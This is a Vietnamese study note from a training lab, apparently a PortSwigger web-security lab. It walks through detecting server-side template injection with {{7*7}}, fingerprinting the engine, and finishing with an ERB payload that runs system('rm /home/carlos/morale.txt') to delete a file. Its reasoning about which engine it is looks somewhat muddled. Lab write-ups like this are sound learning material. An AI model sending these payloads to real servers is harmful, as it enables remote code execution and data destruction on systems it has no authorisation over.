![[ssti-basic.png]]
Lab basic, nhập `{{7*7}}` vào chỗ custom message thấy render `49`.

> [!NOTE] phân tích đề
> - đề cho chỗ nhập message rồi hiển thị lại.
> - sau khi quan sát gói tin này, mình thấy nhập `{{7*7}}` thì response in ra `49` chứ không in nguyên string, nên mình chốt đây là template render chứ không phải in thường.
> - engine chưa rõ (Twig/Jinja2/ERB...), nên mình dò thêm `{{7*'7'}}` (ra `49` là Twig, `7777777` là Jinja2, lỗi là loại khác) để đoán engine trước khi RCE.
> - liên quan: [[lys thuyet SSTI]] , [[server side template injection]]

### hướng giải
- [ ] mở lab, tìm chỗ custom message / comment / name.
- [ ] thử `{{7*7}}` xem ra `49` không.
- [ ] thử thêm `{{7*'7'}}` để đoán Twig hay Jinja2.
- [ ] thử sai syntax kiểu `<%=foobar%>` để đọc lỗi lộ engine.
- [ ] nếu là ERB thì chuyển sang `<%= 7*7 %>` để RCE.

### giải
- mình gửi request này:
```http
GET /?message={{7*7}} HTTP/1.1
Host: xxx.web-security-academy.net
```
- response trả về:
```html
<p>Hello 49</p>
```
- -> thay vì `Hello {{7*7}}`.
- => confirm dính SSTI.
- sau đó mình thử RCE theo engine:
- nếu là ERB:
```http
GET /?message=<%=+7*7+%> HTTP/1.1
```
- -> response ra `49`.
- => chốt là ERB.
- rồi xóa file theo đề:
```http
GET /?message=<%=+system('rm+/home/carlos/morale.txt')+%> HTTP/1.1
```
- -> load lại lab thấy solved.
- kết quả: file `morale.txt` bị xóa.

> [!NOTE] bài học
> - thấy toán tử tính luôn => SSTI.
> - nên mình luôn thử plaintext trước.
> - đừng vội kết luận engine chỉ với 1 payload.
> - tiếp: [[Lab-SSTI info disclosure via objects]]
